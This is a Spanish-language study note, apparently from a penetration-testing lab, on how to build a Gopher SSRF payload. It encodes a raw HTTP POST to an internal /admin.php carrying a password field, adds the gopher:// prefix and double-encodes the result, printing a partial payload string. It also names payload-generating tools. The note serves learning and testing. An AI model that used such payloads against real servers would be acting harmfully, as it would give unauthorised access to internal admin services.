---
aliases:
tags:
  - type/concept
  - vuln/ssrf
  - technique/lateral-movement
  - asset/web-app
kind: Concept
linked:
  - "[[SSRF - Gopher]]"
---
# Anatomía de la Construcción de un Payload Gopher

___

El proceso consta de 3 fases: **Diseño de la Petición**, **Codificación (Encoding)** y **Ensamblaje**.

## Fase 1: La Petición HTTP Original (Lo que se quiere enviar)

Primero, escribimos la petición HTTP tal cual la enviaríamos si estuviéramos dentro del servidor.
```HTTP
POST /admin.php HTTP/1.1
Host: dateserver.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

> **Nota:** Es vital calcular bien el `Content-Length` (13 caracteres en `adminpw=admin`). Si se falla aquí, la petición se quedará colgada.

## Fase 2: Traducción a Formato URL (Encoding)

Gopher no entiende de espacios ni de saltos de línea de texto. Hay que convertir todo a caracteres URL (`%XX`).
1. **Espacios:** Se cambian por `%20`.
2. **Saltos de Línea:** En HTTP, una línea nueva es `\r\n` (Carriage Return + Line Feed). Esto se traduce como `%0D%0A`.

**Transformación:**

| **Texto Original**                                | **Codificación Gopher**        |
| ------------------------------------------------- | ------------------------------ |
| `POST /admin.php HTTP/1.1`                        | `POST%20/admin.php%20HTTP/1.1` |
| _(Salto de línea)_                                | `%0D%0A`                       |
| `Host: dateserver.com`                            | `Host:%20dateserver.com`       |
| _(Salto de línea)_                                | `%0D%0A`                       |
| ...                                               | ...                            |
| _(Doble Salto para separar cabeceras del cuerpo)_ | `%0D%0A%0D%0A`                 |
| `adminpw=admin`                                   | `adminpw=admin`                |

**Resultado Intermedio:**
`POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin`

## Fase 3: El Prefijo Gopher y el Carácter "Basura"

Ahora debemos decirle al navegador/curl que use el protocolo Gopher.
1. **Esquema:** `gopher://`
2. **Destino:** `dateserver.com:80`
3. **El Selector (El truco):** Gopher requiere un carácter inicial para saber el tipo de archivo. Como estamos enviando datos brutos, usamos un guion bajo `_` que el servidor Gopher eliminará antes de enviar los datos.

**Estructura:**
`gopher://host:puerto/` + `_` + `PAYLOAD_CODIFICADO`

## Fase 4: La Doble Codificación (El paso final en el ejemplo)

El texto menciona un paso extra crucial:

> "Since we are sending our URL within the HTTP POST parameter dateserver... we need to URL-encode the entire URL again."

Como se va a meter esta URL de Gopher **dentro** de una petición web (`dateserver=...`), si se envia un `%20`, el servidor web externo lo decodificará como un espacio _antes_ de procesar el SSRF, rompiendo el payload.

Por eso, se codifica los `%` de nuevo (`%` se convierten en `%25`).
- `%20` -> `%2520`
- `%0D%0A` -> `%250D%250A`

**Resultado Final (La "invención"):**
`gopher://dateserver.htb:80/_POST%2520/admin.php%2520HTTP...`

---

## Resumen Visual

No hace falta memorizar esto ni hacerlo a mano siempre. Para eso existen herramientas como:
1. **Gopherus:** Genera payloads automáticamente.
2. **CyberChef:** Se puede usar la receta "To Gopher" o hacer URL Encode manual.

La "magia" es simplemente que se está escribiendo los bytes TCP uno por uno usando `%XX`.